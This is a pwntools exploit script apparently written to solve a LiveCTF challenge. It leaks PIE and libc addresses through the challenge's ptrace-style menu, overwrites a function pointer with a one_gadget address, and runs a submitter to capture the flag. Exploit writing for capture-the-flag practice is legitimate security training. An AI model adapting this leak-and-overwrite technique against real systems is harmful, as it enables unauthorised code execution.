#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))

#p = process("../handout/challenge")
context.arch = "amd64"

def ptrace(request, addr, data):
    p.sendlineafter("?", request)
    p.sendlineafter("?", addr)
    p.sendlineafter("?", data)
    p.recvuntil("returned ")
    return p.recvline()[:-1]

pie_base = ptrace(b"3", b"8", b"0")
p.sendline(b"1")
pie_base = int(pie_base, 16) - 0x3d68
print(hex(pie_base))

libc_base = ptrace(b"3", b"80", b"0")
p.sendline(b"1")
libc_base = int(libc_base, 16) - 0xeabc7

og = 0xebcf8
puts = 0x28490
get_pid = 0x3f88

sh = shellcraft.amd64.execve("./submitter", 0, 0)

ptrace(b"5", hex(pie_base + get_pid), hex(libc_base + og))

p.sendline(b"1")

ptrace(b"7", b"0", b"0")
p.sendline(b"0")

p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()
